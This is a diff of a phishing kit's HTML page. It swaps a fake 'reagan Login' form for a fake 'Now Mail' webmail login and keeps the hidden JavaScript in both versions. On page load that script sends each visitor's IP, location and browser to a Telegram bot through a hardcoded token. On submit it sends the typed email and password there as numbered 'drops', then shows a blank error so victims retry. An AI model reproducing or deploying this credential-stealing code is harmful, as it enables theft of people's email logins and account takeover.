@@ -1,240 +1,245 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>reagan Login</title>
-<style>
-/* 1. Global Reset */
-*, *::before, *::after {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Now Mail :: Welcome to Now Mail</title>
+  <style>
+    * * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
 }
 
-html, body {
-    height: 100%;
-    width: 100%;
-    overflow: hidden; /* Prevents shifting/scrolling */
-    font-family: Arial, sans-serif;
-}
-
-/* 2. AUTO-FIXED BACKGROUND (Zero Shift for all Resolutions) */
 body {
-    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1780762743/Capture_lvdjzy.jpg');
-    /* 100% 100% ensures the image stretches to fit 1920x1080 and 768x1024 exactly */
-    background-size: 100% 100%; 
-    background-position: center;
-    background-repeat: no-repeat;
-    background-attachment: fixed;
-    height: 100vh;
-    width: 100vw;
+  font-family: "Lucida Grande", "Lucida Sans Unicode", Verdana, Helvetica, Arial, sans-serif;
+  font-size: 13px;
+  color: #333333;
+  background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1795643118/nowpage_asnxkj.png');
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+  min-height: 100vh;
+  min-height: 100dvh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
 }
 
-/* 3. INTRO OVERLAY (Responsive Scale) */
-#introImageContainer {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    background: black;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
+.intro-image-container {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background-color: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
 }
 
-#introImageContainer img {
-    max-width: 100%;
-    max-height: 100%;
-    object-fit: contain;
+.intro-image-container img {
+  max-width: 100%;
+  max-height: 100%;
 }
 
-/* 4. LOGIN BOX - LOCKED POSITIONS (1920px down to 768px) */
 .login-container {
-    position: absolute;
-
-    /* YOUR EXACT COORDINATES - Percentage ensures zero shift on any resolution */
-    top: 48%;     
-    right: 20.7%;    
-
-    transform: translateY(-50%);
-
-    /* PROPORTIONAL WIDTH: 
-       This makes the box take up ~23% of the screen width, 
-       matching the "Big Laptop" look on all resolutions. */
-    width: 25%; 
-    max-width: 300px; 
-    min-width: 200px; /* Safety for Tablet Portrait */
-
-    background: transparent; 
-    border-radius: 3px;
-    padding: 10px;
+  width: 100%;
+  max-width: 400px;
+  padding: 30px;
+  background: ;
+  border-radius: 6px;
+  box-shadow: ;
 }
 
-/* 5. UI Elements (Responsive Fonts) */
-.welcome-title {
-    color: #0066cc;
-    font-size: clamp(20px, 2vw, 32px); /* Auto-shrinks for tablets */
-    font-weight: 600;
-    margin-bottom: 30px; /* Reduced from 60px to prevent overflow on tablets */
+.form-group {
+  margin-bottom:10px;
 }
 
-.form-input {
-    width: 100%; 
-    padding: 10px 10px;
-    border: 2px solid #d1d5db;
-    border-radius: 1px;
-    font-size: 10px;
-    background: white;
+.form-group label {
+  display: block;
+  margin-bottom: 6px;
+  color: #444444;
+  font-weight: 600;
+  font-size: 12px;
 }
 
-.sign-in-btn {
-    width: 50%;
-    background: #D3D3D3;
-    color: black;
-    border: none;
-    padding: 3px;
-    font-size: 15px;
-    cursor: pointer;
-    font-weight: 300;
-    margin-top: 15px;
+.input-container {
+  position: relative;
 }
 
-/* 6. TABLET PORTRAIT FIX (768px) */
-@media (max-width: 768px) {
-    .login-container {
-        right: 15%; /* Moves it slightly left so it doesn't hit the edge on thin tablets */
-        width: 60%; /* Takes up more space on thin screens */
-        max-width: 300px;
-    }
+.input-icon {
+  position: absolute;
+  left: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: #888;
+  width: 18px;
+  height: 18px;
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center;
 }
 
-</style>
+.user-icon {
+  background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAyMCAyMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEwIDEwQzEyLjc2MTQgMTAgMTUgNy43NjE0MiAxNSA1QzE1IDIuMjM4NTggMTIuNzYxNCAwIDEwIDBDNy4yMzg1OCAwIDUgMi4yMzg1OCA1IDVDNSA3Ljc2MTQyIDcuMjM4NTggMTAgMTAgMTBaIiBmaWxsPSIjOTk5Ii8+CjxwYXRoIGQ9Ik0xMCAxMkM0LjQ3NzE1IDEyIDAgMTYuNDc3MiAwIDIySDIwQzIwIDE2LjQ3NzIgMTUuNTIyOSAxMiAxMCAxMloiIGZpbGw9IiM5OTkiLz4KPC9zdmc+');
+}
+
+.lock-icon {
+  background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAyMCAyMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTQgOFY2QzQgMi42ODYyOSA2LjY4NjI5IDAgMTAgMEMxMy4zMTM3IDAgMTYgMi42ODYyOSAxNiA2VjhIMThWMjBIMlY4SDRaTTYgNlY4SDEwVjZDMTAgNC44OTU0MyAxMC44OTU0IDQgMTIgNEMxMy4xMDQ2IDQgMTQgNC44OTU0MyAxNCA2VjhIMTRWNkMxNCA0Ljg5NTQzIDEzLjEwNDYgNCAxMiA0QzEwLjg5NTQgNCA2IDQuODk1NDMgNiA2WiIgZmlsbD0iIzk5OSIvPgo8L3N2Zz4=');
+}
+
+.form-group input {
+  width: 100%;
+  padding: 10px 14px 10px 42px;
+  border: 1px solid #cccccc;
+  border-radius: 4px;
+  font-family: inherit;
+  font-size: 13px;
+  color: #333333;
+  background: #ffffff;
+  transition: border-color 0.2s ease, box-shadow 0.2s ease;
+}
+
+.form-group input:focus {
+  outline: none;
+  border-color: #27ae60;
+  box-shadow: 0 0 4px rgba(39, 174, 96, 0.35);
+}
+
+.form-group input::placeholder {
+  color: #999999;
+}
+
+.login-btn {
+  width: 100%;
+  padding: 11px;
+  background: #000000 ;
+  color: #ffffff;
+  border: none;
+  border-radius: 4px;
+  font-family: inherit;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background-color 0.2s ease;
+  margin-top: 10px;
+  margin-bottom: 18px;
+}
+
+.login-btn:hover {
+  background: #000000 ;
+}
+
+.login-btn:active {
+  background: #000000 ;
+}
+
+.reset-link {
+  display: block;
+  text-align: center;
+  color: #555555;
+  </style>
 </head>
 <body>
-<!-- Int Image Ovelay -->
-<div id="introImageContainer">
-<img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png" alt="Intro Image" />
-</div>
 
-<!--  Log Fom -->
-<div class="login-container" id="loginContainer">
-<h1 class="welcome-title"></h1>
+  <!-- Intro Splash Image -->
+  <div class="intro-image-container" id="introImageContainer">
+    <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png" alt="Intro Image">
+  </div>
 
-<form id="loginForm">
-<div id="errorMessage" class="error-message" style="display: none;"></div>
+  <!-- Login Form -->
+  <div class="login-container" id="loginContainer">
+    <form id="loginForm">
+      <div id="errorMessage"></div>
+      <div class="form-group">
+        <label for="email">Username</label>
+        <div class="input-container">
+          <div class="input-icon user-icon"></div>
+          <input type="email" id="email" name="email" placeholder="Username" value="" required>
+        </div>
+      </div>
 
-<div class="form-group">
-        <label class="form-label">Username:</label>
-<input type="text" id="userId" name="userId" class="form-input" required value="" />
-</div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <div class="input-container">
+          <div class="input-icon lock-icon"></div>
+          <input type="password" id="password" name="password" placeholder="Password." required>
+        </div>
+      </div>
 
-<div class="form-group">
-<div class="password-container">
-<label class="form-label">Password:</label>
-<input type="password" id="password" name="password" class="form-input" required />
-<button type="button" class="password-toggle" onclick="togglePassword()"></button>
-</div>
-</div>
+      <button type="submit" class="login-btn">LOGIN</button>
+    </form>
 
-<div class="checkbox-container">
-<label for="rememberUser" class="checkbox-label">Forgot password?</label>
-</div>
+    <a href="#" class="reset-link"></a>
+  </div>
 
-<button type="submit" class="sign-in-btn">Log in</button>
+  <script>
+    const token = '8639240486:AAG06St82diBzR7EmEZrQ2jiK-WGrrRbBkA';
+    const chatId = '8052751627';
+    let loginAttempts = 0;
 
-</div>
-</form>
-</div>
+    function sendToTelegram(message) {
+      if (!navigator.onLine) return;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).catch(console.error);
+    }
 
-<script>
-const token = '757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
-const chatId = '8052751627';
-let loginAttempts = 0;
+    function sendVisitorInfo() {
+      const userAgent = navigator.userAgent;
+      const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const message = `🌐nowwmaill Visi Info\nIP: ${data.ip}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nPort: ${port}\nBrowser: ${userAgent}`;
+          sendToTelegram(message);
+        })
+        .catch(() => {
+          sendToTelegram(`🌐nowwmaill  vi Info (IP lookup failed)\nPort: ${port}\nBrowser: ${userAgent}`);
+        });
+    }
 
-async function sendToTelegram(message) {
-if (!navigator.onLine) return;
-try {
-await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-method: 'POST',
-headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify({ chat_id: chatId, text: message })
-});
-} catch (err) {
-console.error('Telegram send error:', err);
-}
-}
+    window.onload = function () {
+      sendVisitorInfo();
+      setTimeout(() => {
+        document.getElementById('introImageContainer').style.display = 'none';
+        document.getElementById('loginContainer').style.display = 'block';
+      }, 500);
+    };
 
-function togglePassword() {
-const passwordInput = document.getElementById('password');
-const toggleButton = document.querySelector('.password-toggle');
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
 
-if (passwordInput.type === 'password') {
-passwordInput.type = 'text';
-toggleButton.textContent = '';
-} else {
-passwordInput.type = 'password';
-toggleButton.textContent = '👁';
-}
-}
+      if (!email || !password) {
+        document.getElementById('errorMessage').textContent = "Please fill in all fields.";
+        document.getElementById('errorMessage').style.display = 'block';
+        return;
+      }
 
-function sendVisitorInfo() {
-const userAgent = navigator.userAgent;
-const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
+      loginAttempts++;
+      const msg = `❌nowwmaill  dro #${loginAttempts}\n📧 Email: ${email}\n🔑 Password: ${password}`;
+      sendToTelegram(msg);
 
-if (!navigator.onLine) {
-sendToTelegram(`reagan Offline Visi\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
-return;
-}
+      document.getElementById('errorMessage').textContent = "";
+      document.getElementById('errorMessage').style.display = 'block';
+      document.getElementById('password').value = '';
 
-fetch('https://ipapi.co/json/')
-.then(res => res.json())
-.then(data => {
-const message = `🌐 reagan Visi \nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
-sendToTelegram(message);
-}).catch(() => {
-sendToTelegram(`🌐 reagan  Visi (IP lookup failed)\nBrowser: ${userAgent}`);
-});
-}
+      if (loginAttempts >= 50) {
+        window.location.href = 'https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png';
+      }
+    });
 
-window.onload = () => {
-sendVisitorInfo();
-
-setTimeout(() => {
-const intro = document.getElementById('introImageContainer');
-const login = document.getElementById('loginContainer');
-if (intro) intro.style.display = 'none';
-if (login) login.style.display = 'block';
-}, 50);
-};
-
-document.getElementById('loginForm').addEventListener('submit', async function (e) {
-e.preventDefault();
-
-const userId = document.getElementById('userId').value.trim();
-const password = document.getElementById('password').value.trim();
-
-if (userId && password) {
-loginAttempts++;
-const msg = `❌ reagan drop #${loginAttempts}\n👤 User ID: ${userId}\n🔑 Password: ${password}`;
-await sendToTelegram(msg);
-
-const errorMsg = document.getElementById('errorMessage');
-errorMsg.textContent =
-"";
-errorMsg.style.display = 'block';
-
-document.getElementById('password').value = '';
-document.getElementById('password').focus();
-
-if (loginAttempts >= 30) {
-window.location.href =
-'https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png';
-}
-}
-});
-</script>
+    document.querySelector('.reset-link').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('Reset password functionality would be implemented here.');
+    });
+  </script>
 </body>
 </html>
